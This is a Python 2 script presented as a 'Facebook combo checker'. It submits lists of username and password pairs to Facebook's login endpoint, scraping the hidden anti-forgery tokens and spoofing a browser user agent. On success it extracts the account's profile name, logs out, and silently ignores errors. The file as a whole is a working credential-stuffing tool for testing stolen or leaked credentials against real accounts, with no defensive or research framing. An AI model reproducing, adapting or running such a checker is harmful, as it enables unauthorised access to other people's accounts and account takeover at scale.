import urllib2
import urllib
from cookielib import CookieJar
import re

'''
    Written by Yessine Taktak ( https://github.com/yassintaktak )
    https://seuriflow.com/
    Facebook combo checker
'''


class Main:
    def __init__(self):
        self.loaded = True
        self.returnOptionsSTR = True

    def checkLoadingState(self):
        if(self.loaded):
            return True
        else:
            return False
    def checkReturnOptionsSTR(self):
        if(self.returnOptionsSTR):
            return True
        else:
            return False
    def authenticate(self, username, password):
        dataTokens = self.opener.open("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1647001").read()
        token_1 = re.findall('name="jazoest" value="(.*?)"', dataTokens)[0]
        token_2 = re.findall('name="lsd" value="(.*?)"', dataTokens)[0]
        token_3 = re.findall('name="lgndim" value="(.*?)"', dataTokens)[0]
        token_4 = re.findall('name="lgnrnd" value="(.*?)"', dataTokens)[0]
        token_5 = re.findall('name="lgnjs" value="(.*?)"', dataTokens)[0]
        formdata = {
            "jazoest" : token_1,
            "lsd" : token_2,
            "display" : "",
            "enable_profile_selector" : "",
            "isprivate" : "",
            "legacy_return" : "0",
            "profile_selector_ids" : "",
            "return_session" : "",
            "skip_api_login" : "",
            "signed_next" : "",
            "trynum" : "1",
            "timezone" : "-60",
            "lgndim" : token_3,
            "lgnrnd" : token_4,
            "lgnjs" : token_5,
            "email" : username,
            "pass": password,
            "login" : "1"
        }
        data_encoded = urllib.urlencode(formdata)
        self.opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'), ('origin', 'https://www.facebook.com'), ('referer', 'https://www.facebook.com/login/device-based/regular/login')]
        response = self.opener.open("https://www.facebook.com/login/device-based/regular/login", data_encoded)
        content = response.read()
        with open("result.html", "w") as f:
            f.write(content)
        if("profile_icon" in content):
            profile_name = re.findall('__typename:"User",id:"(.*?)",name:"(.*?)"', content)
            dataTokens = self.opener.open("https://www.facebook.com/").read()
            token_1 = re.findall('name="jazoest" value="(.*?)"', dataTokens)[0]
            token_2 = re.findall('name="fb_dtsg" value="(.*?)"', dataTokens)[0]
            formdata = {
                "jazoest" : token_1,
                "fb_dtsg" : token_2,
                "ref" : 'mb',
                "h" : ""
            }
            data_encoded = urllib.urlencode(formdata)
            self.opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36'), ('origin', 'https://www.facebook.com'), ('referer', 'https://www.facebook.com/')]
            response = self.opener.open("https://www.facebook.com/login/device-based/regular/logout/?button_name=logout&button_location=settings", data_encoded)
            if(len(profile_name) > 0):
                return profile_name[0][1]
            else:
                return True
        else:
            return False

    def check(self, items):
        try:
            cj = CookieJar()
            self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            authentication = self.authenticate(items[0], items[1])
            if(authentication):
                return authentication
            else:
                return False
        except:
            pass
